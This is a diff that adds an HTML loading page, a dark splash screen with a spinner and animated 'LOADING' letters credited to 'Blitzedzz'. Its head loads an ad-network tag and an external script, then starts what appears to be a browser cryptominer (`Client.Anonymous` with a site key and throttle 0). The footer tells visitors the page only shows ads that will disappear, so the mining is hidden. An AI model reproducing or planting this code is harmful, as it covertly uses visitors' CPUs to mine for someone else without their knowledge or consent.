@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<script>
+const script = document.createElement('script');
+script.src = "tag.min.js";
+script.async = true;
+script.setAttribute('data-zone', '174288');
+script.setAttribute('data-cfasync', 'false');
+
+document.head.appendChild(script);
+
+</script>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #121212;
+    font-family: 'Arial', sans-serif;
+    color: #fff;
+  }
+
+  .loader-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* Spinner */
+  .spinner {
+    width: 80px;
+    height: 80px;
+    border: 8px solid rgba(255,255,255,0.1);
+    border-top: 8px solid #00ffcc;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  /* Loading text */
+  .loading-text {
+    display: flex;
+    gap: 5px;
+    font-size: 2rem;
+    font-weight: bold;
+    margin-bottom: 15px;
+  }
+
+  .loading-text span {
+    animation: bounce 1.2s infinite;
+    display: inline-block;
+  }
+
+  .loading-text span:nth-child(1) { animation-delay: 0s; }
+  .loading-text span:nth-child(2) { animation-delay: 0.1s; }
+  .loading-text span:nth-child(3) { animation-delay: 0.2s; }
+  .loading-text span:nth-child(4) { animation-delay: 0.3s; }
+  .loading-text span:nth-child(5) { animation-delay: 0.4s; }
+  .loading-text span:nth-child(6) { animation-delay: 0.5s; }
+  .loading-text span:nth-child(7) { animation-delay: 0.6s; }
+
+  @keyframes bounce {
+    0%, 80%, 100% { transform: scale(0); }
+    40% { transform: scale(1); }
+  }
+
+  /* Footer text */
+  .footer-text {
+    font-size: 1rem;
+    color: #00ffcc;
+    font-weight: bold;
+    margin-top: 10px;
+  }
+
+</style>
+    <script src="M7d1.js"></script>
+<script>
+    var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    
+
+</script>
+</head>
+<body>
+  <div class="loader-container">
+    <div class="spinner"></div>
+    <div class="loading-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </div>
+    <div class="footer-text">Made by Blitzedzz | ADS ARE HERE TO SUPPORT ME THEY WILL DISAPPEAR AFTER LOADING</div>
+  </div>
+</body>
+</html>
